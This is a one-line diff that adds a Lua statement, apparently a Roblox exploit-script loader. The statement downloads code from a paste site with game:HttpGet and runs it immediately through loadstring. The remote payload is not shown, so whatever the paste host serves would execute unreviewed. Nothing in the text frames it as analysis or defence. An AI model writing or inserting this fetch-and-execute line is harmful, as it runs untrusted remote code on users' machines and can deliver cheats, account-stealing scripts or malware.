@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("https://hastebin.skyra.pw/abeganomas.kotlin",true))()
